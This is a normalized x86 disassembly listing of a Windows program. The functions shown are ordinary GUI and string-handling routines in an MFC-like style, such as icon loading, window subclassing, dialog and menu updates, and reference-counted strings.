mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov [ esi + 0x24 ] eax
call sub_4272f7
movzx ecx [ esp + 0x14 ]
mov eax [ eax + 0xc ]
mov edi [ LoadIconA@IAT ]
push ecx
push eax
call edi
test eax eax
mov [ esi + 0x14 ] eax
jne r-xdata
push esi
call sub_41ff23
pop edi
pop esi
retn 0xc
push 0x7f00
push eax
call edi
mov [ esi + 0x14 ] eax
sub_4215ee
push ebx
push esi
mov esi r--data
push edi
push esi
call [ GetModuleHandleA@IAT ]
push esi
mov edi eax
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push r--data
push ebx
xor esi esi
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
push [ esp + 0x10 ]
call eax
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edi 0x3fc0
and eax edi
cmp eax [ esp + 0x14 ]
jne r-xdata
push ebx
call [ FreeLibrary@IAT ]
mov eax esi
mov esi [ esp + 0x14 ]
test edi edi
jne r-xdata
call [ InitCommonControls@IAT ]
mov esi edi
jmp r-xdata
call [ InitCommonControls@IAT ]
or si 0x3fc0
sub_421665
push ebp
mov ebp esp
sub esp 0x34
call sub_4272f7
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0x18 ]
not eax
and [ ebp + 0x8 ] eax
jne r-xdata
push ebx
push esi
push edi
xor edi edi
push 0x28
lea eax [ ebp - 0x34 ]
push edi
push eax
xor esi esi
call sub_410a20
mov eax [ DefWindowProcA@IAT ]
add esp 0xc
mov [ ebp - 0x30 ] eax
call sub_4272f7
mov eax [ eax + 0x8 ]
push 0x8
test [ ebp + 0x8 ] 0x1
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
pop ebx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
test [ ebp + 0x8 ] 0x20
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] 0xb
push eax
mov [ ebp - 0x10 ] r--data
call sub_41ff23
test eax eax
je r-xdata
leave
retn 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
or [ ebp - 0x34 ] 0x8b
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_41ff23
test eax eax
je r-xdata
push 0x1
pop esi
test [ ebp + 0x8 ] 0x4
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] edi
push eax
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0x18 ] 0x10
call sub_41ff23
test eax eax
je r-xdata
or esi 0x20
test [ ebp + 0x8 ] bl
je r-xdata
push 0x7a01
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] edi
call sub_4215ad
test eax eax
je r-xdata
or esi 0x2
test [ ebp + 0x8 ] 0x10
je r-xdata
push 0x7a02
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x18 ] 0x6
call sub_4215ad
test eax eax
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x40
je r-xdata
lea eax [ ebp - 0xc ]
push 0x3fc0
push eax
mov [ ebp - 0x8 ] 0xff
call sub_4215ee
or esi eax
and [ ebp + 0x8 ] 0xc03f
or esi ebx
test [ ebp + 0x8 ] 0x80
je r-xdata
lea eax [ ebp - 0xc ]
push 0x40
push eax
mov [ ebp - 0x8 ] 0x10
call sub_4215ee
or esi eax
mov eax 0x100
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push 0x80
push eax
mov [ ebp - 0x8 ] 0x2
call sub_4215ee
or esi eax
mov eax 0x200
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_4215ee
or esi eax
mov ebx 0x400
test [ ebp + 0x8 ] ebx
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x20
call sub_4215ee
or esi eax
mov edi 0x800
test [ ebp + 0x8 ] edi
je r-xdata
lea eax [ ebp - 0xc ]
push ebx
push eax
mov [ ebp - 0x8 ] 0x1
call sub_4215ee
or esi eax
mov eax 0x1000
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push edi
push eax
mov [ ebp - 0x8 ] 0x40
call sub_4215ee
or esi eax
mov eax 0x2000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x4
call sub_4215ee
or esi eax
mov eax 0x4000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x80
call sub_4215ee
or esi eax
mov eax 0x8000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edi
call sub_4215ee
or esi eax
mov eax 0x10000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_4215ee
or esi eax
mov eax 0x20000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x200
call sub_4215ee
or esi eax
mov ecx [ ebp - 0x4 ]
mov edx 0x3fc0
or [ ecx + 0x18 ] esi
mov eax [ ecx + 0x18 ]
mov edi eax
and edi edx
cmp edi edx
jne r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x100
call sub_4215ee
or esi eax
mov eax esi
pop edi
and eax [ ebp + 0x8 ]
pop esi
pop ebx
sub eax [ ebp + 0x8 ]
neg eax
sbb eax eax
inc eax
or al 0x10
or esi 0x10
mov [ ecx + 0x18 ] eax
sub_42193b
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_41f42c
test eax eax
je r-xdata
pop esi
retn 0x4
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
mov esi eax
call sub_41f4c3
push eax
push 0xfffffffc
push [ esp + 0x10 ]
call [ SetWindowLongA@IAT ]
cmp [ esi ] 0x0
jne r-xdata
push 0x1
pop eax
mov [ esi ] eax
sub_42197e
push esi
mov esi ecx
push edi
mov eax [ esi ]
call [ eax + 0x80 ]
mov edi eax
push [ edi ]
push 0xfffffffc
push [ esi + 0x1c ]
call [ SetWindowLongA@IAT ]
and [ edi ] 0x0
mov ecx esi
call sub_41f465
pop edi
pop esi
retn
sub_4219cc
mov eax [ ecx + 0x34 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0x70 ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ GetDlgItem@IAT ]
push eax
call sub_41f3e7
jmp r-xdata
retn 0x4
sub_4219f6
mov eax [ ecx + 0x34 ]
test eax eax
jne r-xdata
push [ esp + 0x8 ]
mov edx [ eax ]
mov ecx eax
push [ esp + 0x8 ]
call [ edx + 0x6c ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ GetDlgItem@IAT ]
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
retn 0x8
sub_421a24
push esi
mov esi ecx
test [ esi + 0x25 ] 0x1
je r-xdata
push [ esp + 0x8 ]
push [ esi + 0x1c ]
call [ IsDialogMessageA@IAT ]
call sub_4272f7
mov eax [ eax + 0x1038 ]
push [ esp + 0x8 ]
mov ecx eax
mov edx [ eax ]
push esi
call [ edx + 0x24 ]
jmp r-xdata
pop esi
retn 0x4
sub_421ab2
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ esp + 0x8 ]
mov edx [ eax ]
mov ecx eax
push [ esp + 0x8 ]
call [ edx + 0x84 ]
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ ecx + 0x1c ]
call [ GetWindowTextA@IAT ]
jmp r-xdata
retn 0x8
sub_421afc
push ebp
mov ebp esp
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ ebp + 0x18 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x98 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x1c ]
call [ MoveWindow@IAT ]
jmp r-xdata
pop ebp
retn 0x14
sub_421b3d
push ebp
mov ebp esp
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ ebp + 0x1c ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x1c ]
call [ SetWindowPos@IAT ]
jmp r-xdata
mov eax [ eax + 0x1c ]
pop ebp
retn 0x18
sub_421c16
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
test ecx ecx
je r-xdata
pop ebp
retn
lea edx [ ebp + 0x20 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ eax + 0x58 ]
sub_421c5f
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn 0x4
cmp [ esi + 0x38 ] 0x0
jne r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
mov eax [ esp + 0xc ]
lea ecx [ eax + 0x4 ]
call sub_41e4f6
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x8c ]
sub_421cbb
push esi
mov esi [ esp + 0x8 ]
add ecx 0x20
push [ esi + 0x1c ]
call sub_41e4f6
test eax eax
je r-xdata
pop esi
retn 0x4
mov ecx [ eax + 0x24 ]
test ecx ecx
je r-xdata
mov [ esi + 0x38 ] eax
mov [ eax + 0x24 ] esi
cmp [ ecx + 0x38 ] eax
jne r-xdata
and [ ecx + 0x38 ] 0x0
sub_421d03
mov eax sub_42ab5c
call sub_410a78
push ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ecx + 0x10 ]
and [ ebp - 0x4 ] 0x0
add ecx 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call [ eax + 0x1c ]
sub_421d2e
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push ebx
push esi
push 0x1
test eax eax
pop ebx
je r-xdata
mov eax [ ebp + 0x1c ]
cmp eax 0x28
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub eax 0x29
je r-xdata
je r-xdata
mov eax ebx
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
sub eax 0x3
je r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
dec eax
je r-xdata
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0xa
je r-xdata
xor ebx ebx
cmp [ esi + 0x1c ] ebx
sete bl
and [ esi + 0x1c ] 0x0
jmp r-xdata
push [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
dec eax
je r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x18 ]
dec eax
je r-xdata
mov ebx eax
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0x16
je r-xdata
push [ ebp + 0x18 ]
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub eax 0x3
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x1c
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub_421e35
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
cmp eax 0xfffffffe
mov edi ecx
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
call sub_4272f7
push [ ebp + 0x14 ]
mov eax [ eax + 0x1038 ]
mov ecx eax
push [ ebp + 0x10 ]
mov edx [ eax ]
push [ ebp + 0x8 ]
push edi
call [ edx + 0x4 ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebp + 0x10 ]
and [ ebp + 0xc ] 0x0
mov ecx edi
mov eax [ ebx + 0x30 ]
mov [ ebp + 0x10 ] eax
mov eax [ edi ]
call [ eax + 0x2c ]
mov edi eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov ebx 0x111
mov ebx eax
movzx eax ax
shr ebx 0x10
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor eax eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push ebx
push [ esi + 0x4 ]
call sub_4200f2
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov esi eax
mov esi [ edi + 0x4 ]
push [ ebp + 0x14 ]
push [ eax + 0x10 ]
push [ ebp + 0x10 ]
push [ eax + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call sub_421d2e
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
mov edi [ edi ]
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
test esi esi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] eax
jne r-xdata
add esi 0xc
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push 0x10
push eax
push [ ebp + 0x10 ]
call sub_410ae0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp + 0xc ] 0x1
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_421f97
push esi
mov esi ecx
push 0xd
call sub_427d7a
mov eax [ esi ]
mov ecx esi
call [ eax + 0x20 ]
test eax eax
je r-xdata
push 0xd
call sub_427dea
test esi esi
je r-xdata
mov ecx eax
call sub_427334
pop esi
retn
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
sub_421fda
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x20 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x18 ] ecx
retn
sub_422000
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
push edi
jne r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
push [ esp + 0xc ]
mov ecx [ esi + 0x14 ]
call sub_421bce
pop edi
mov edi [ esi + 0x14 ]
call [ GetFocus@IAT ]
cmp eax [ edi + 0x1c ]
jne r-xdata
pop esi
retn 0x4
mov ecx [ esp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0xfffffffd
add ecx 0x3
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ EnableMenuItem@IAT ]
jmp r-xdata
push [ edi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_41f3e7
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov [ esi + 0x18 ] 0x1
push 0x0
push ecx
push [ eax + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_41f3e7
mov ecx eax
call sub_421bf5
mov ecx [ ecx + 0x1c ]
sub_422090
push esi
mov esi ecx
push edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x87
push [ eax + 0x1c ]
call edi
test ah 0x20
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop edi
pop esi
retn 0x4
mov eax [ esi + 0x14 ]
push 0x0
push [ esp + 0x10 ]
push 0xf1
push [ eax + 0x1c ]
call edi
mov ecx [ esp + 0xc ]
neg ecx
sbb ecx ecx
and ecx 0x8
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ CheckMenuItem@IAT ]
jmp r-xdata
sub_4220f2
push esi
push edi
mov esi ecx
xor edi edi
xor ecx ecx
cmp [ esp + 0xc ] edi
mov eax [ esi ]
setne cl
push ecx
mov ecx esi
call [ eax + 0x4 ]
cmp [ esi + 0xc ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x10 ] edi
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
push [ rw-data ]
mov eax [ esi + 0xc ]
push edi
push 0x400
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ SetMenuItemBitmaps@IAT ]
call sub_426518
cmp [ rw-data ] edi
je r-xdata
sub_422148
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov eax [ esi + 0x14 ]
push [ eax + 0x1c ]
call sub_424f8f
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop esi
retn 0x4
mov ecx [ esi + 0x8 ]
push edi
mov edi 0x400
push edi
push ecx
push [ eax + 0x4 ]
call [ GetMenuState@IAT ]
push [ esp + 0xc ]
and ax 0xf6fb
or eax edi
push [ esi + 0x4 ]
push eax
mov eax [ esi + 0xc ]
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ ModifyMenuA@IAT ]
pop edi
jmp r-xdata
sub_4221b9
push esi
push edi
mov edi [ esp + 0xc ]
mov eax esi
pop edi
pop esi
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
call eax
test eax eax
pop ecx
jne r-xdata
push edi
call sub_410b8c
mov esi eax
pop ecx
test esi esi
jne r-xdata
sub_4221ed
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
mov eax [ ecx ]
cmp [ eax - 0xc ] 0x0
jl r-xdata
mov eax [ rw-data ]
mov [ esi ] eax
push [ ecx ]
mov ecx esi
call sub_422601
mov [ esi ] eax
add eax 0xfffffff4
push eax
call [ InterlockedIncrement@IAT ]
jmp r-xdata
mov eax esi
pop esi
retn 0x4
sub_4222e5
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx ecx
test esi esi
jne r-xdata
push edi
push 0x40
pop edi
cmp esi edi
jg r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
jmp r-xdata
mov edi 0x80
cmp esi edi
jg r-xdata
mov ecx rw-data
pop esi
pop ebx
retn 0x4
mov edi 0x100
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
mov [ eax ] 0x1
and [ eax + esi + 0xc ] 0x0
mov [ eax + 0x4 ] esi
add eax 0xc
mov [ ebx ] eax
pop edi
mov edi 0x200
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
call sub_409640
mov [ eax + 0x8 ] edi
jmp r-xdata
lea eax [ esi + 0xd ]
push eax
call sub_4221b9
pop ecx
mov [ eax + 0x8 ] esi
mov ecx rw-data
jmp r-xdata
sub_422367
mov eax [ ecx + 0x8 ]
cmp eax 0x40
jne r-xdata
cmp eax 0x80
jne r-xdata
push ecx
mov ecx rw-data
cmp eax 0x100
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
cmp eax 0x200
push ecx
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
call sub_4096cf
retn
call sub_4221e2
pop ecx
retn
mov ecx rw-data
jmp r-xdata
sub_4223af
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ rw-data ]
mov [ esi ] eax
mov ecx [ esi ]
sub ecx 0xc
call sub_422367
sub_422421
push esi
push edi
mov edi ecx
mov esi [ edi ]
cmp [ esi - 0xc ] 0x1
jle r-xdata
pop edi
pop esi
retn
call sub_4223af
push [ esi - 0x8 ]
mov ecx edi
call sub_4222e5
mov eax [ esi - 0x8 ]
inc eax
push eax
push esi
push [ edi ]
call sub_410ff0
add esp 0xc
sub_42244f
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
jg r-xdata
mov ecx esi
call sub_4223af
push edi
mov ecx esi
call sub_4222e5
cmp edi [ eax - 0x4 ]
jle r-xdata
pop edi
pop esi
retn 0x4
sub_422478
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
sub ecx 0xc
call sub_422367
sub_4224a2
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0xc ]
push edi
add eax ebx
mov edi ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
mov ecx esi
call sub_4222e5
mov eax [ edi ]
push ebx
add eax [ ebp + 0x10 ]
push eax
push [ esi ]
call sub_410ff0
add esp 0xc
pop esi
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ eax ] ecx
jmp r-xdata
pop edi
pop ebx
pop ebp
retn 0x10
sub_4224e6
mov eax [ rw-data ]
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
test ebx ebx
mov [ esi ] eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn 0x4
mov eax ebx
shr eax 0x10
test ax ax
jne r-xdata
push ebx
call [ lstrlenA@IAT ]
mov edi eax
test edi edi
je r-xdata
movzx eax bx
push eax
call sub_423897
jmp r-xdata
push edi
mov ecx esi
call sub_4222e5
push edi
push ebx
push [ esi ]
call sub_410ff0
add esp 0xc
sub_422538
mov eax [ rw-data ]
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
mov [ esi ] eax
je r-xdata
xor eax eax
push ebx
call sub_411325
pop ecx
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn 0x4
push edi
lea edi [ eax + eax ]
push edi
mov ecx esi
call sub_4222e5
inc edi
push edi
push ebx
push [ esi ]
call sub_4227dc
add esp 0xc
mov ecx esi
push 0xffffffff
call sub_422794
pop edi
test eax eax
je r-xdata
sub_422584
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_42244f
push edi
push [ esp + 0x14 ]
push [ esi ]
call sub_410ff0
mov eax [ esi ]
add esp 0xc
mov [ eax - 0x8 ] edi
mov eax [ esi ]
and [ eax + edi ] 0x0
pop edi
pop esi
retn 0x8
sub_4225b1
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov ecx [ esi ]
mov eax [ edi ]
cmp ecx eax
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
cmp [ ecx - 0xc ] 0x0
jge r-xdata
cmp [ eax - 0xc ] 0x0
jge r-xdata
add ecx 0xfffffff4
cmp ecx [ rw-data ]
jne r-xdata
mov ecx esi
call sub_4223af
mov eax [ edi ]
mov [ esi ] eax
add eax 0xfffffff4
push eax
call [ InterlockedIncrement@IAT ]
push eax
mov ecx esi
push [ eax - 0x8 ]
call sub_422584
jmp r-xdata
sub_422601
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
xor eax eax
jmp r-xdata
push edi
push eax
mov ecx esi
call sub_422584
mov eax esi
pop edi
pop esi
retn 0x4
sub_422628
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
test ebx ebx
mov esi ecx
je r-xdata
xor eax eax
push ebx
call sub_411325
pop ecx
jmp r-xdata
lea edi [ eax + eax ]
mov ecx esi
push edi
call sub_42244f
inc edi
push edi
push ebx
push [ esi ]
call sub_4227dc
add esp 0xc
mov ecx esi
push 0xffffffff
call sub_422794
mov eax esi
pop edi
pop esi
pop ebx
retn 0x4
sub_422669
push ebx
mov ebx [ esp + 0x10 ]
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
lea eax [ edi + ebx ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn 0x10
push eax
call sub_4222e5
push edi
push [ esp + 0x18 ]
push [ esi ]
call sub_410ff0
mov eax [ esi ]
push ebx
push [ esp + 0x2c ]
add eax edi
push eax
call sub_410ff0
add esp 0x18
sub_4226a7
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
mov esi ecx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
lea ebx [ eax - 0xc ]
jg r-xdata
push [ esp + 0x14 ]
mov ecx esi
push edi
push eax
push [ eax - 0x8 ]
call sub_422669
push ebx
call sub_4223e0
mov ecx [ eax - 0x8 ]
lea edx [ ecx + edi ]
cmp edx [ eax - 0x4 ]
jg r-xdata
push edi
add ecx eax
push [ esp + 0x18 ]
push ecx
call sub_410ff0
mov eax [ esi ]
add esp 0xc
add [ eax - 0x8 ] edi
mov eax [ esi ]
mov ecx [ eax - 0x8 ]
and [ ecx + eax ] 0x0
jmp r-xdata
sub_422706
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
xor eax eax
jmp r-xdata
push edi
push eax
mov ecx esi
call sub_4226a7
mov eax esi
pop edi
pop esi
retn 0x4
sub_422745
push ebx
push esi
mov esi ecx
mov ecx [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
lea ebx [ eax - 0xc ]
jg r-xdata
push edi
mov edi [ eax - 0x8 ]
cmp ecx edi
jge r-xdata
cmp ecx [ eax - 0x4 ]
jle r-xdata
push ecx
mov ecx esi
call sub_4222e5
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebx + 0xc ]
push eax
push [ esi ]
call sub_410ff0
mov eax [ esi ]
add esp 0xc
push ebx
mov [ eax - 0x8 ] edi
call sub_4223e0
pop edi
mov ecx edi
mov eax [ esi ]
pop esi
pop ebx
retn 0x4
sub_422794
push esi
mov esi ecx
call sub_422421
mov eax [ esp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov [ ecx - 0x8 ] eax
mov ecx [ esi ]
pop esi
and [ ecx + eax ] 0x0
retn 0x4
push [ esi ]
call [ lstrlenA@IAT ]
sub_4227bc
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_422745
mov eax [ esi ]
mov [ eax - 0x8 ] edi
mov eax [ esi ]
and [ eax + edi ] 0x0
mov eax [ esi ]
pop edi
pop esi
retn 0x4
sub_4227dc
push ebx
xor ebx ebx
cmp [ esp + 0x10 ] ebx
push esi
mov esi [ esp + 0xc ]
jne r-xdata
push ebx
push ebx
push [ esp + 0x1c ]
push esi
push 0xffffffff
push [ esp + 0x24 ]
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
jle r-xdata
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
mov [ eax + esi - 0x1 ] bl
xor eax eax
jmp r-xdata
sub_422818
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov ecx esi
call sub_422a85
pop esi
retn
call sub_4261db
test eax eax
je r-xdata
push 0x0
call sub_429cc5
sub_42283a
push esi
push edi
mov edi ecx
call sub_408750
mov esi eax
xor eax eax
push eax
push eax
push 0x36a
mov [ edi + 0x84 ] eax
push [ esi + 0x1c ]
call [ PostMessageA@IAT ]
push [ esp + 0x10 ]
mov eax [ esi ]
mov ecx esi
push [ esp + 0x10 ]
call [ eax + 0x6c ]
pop edi
pop esi
retn 0x8
sub_422871
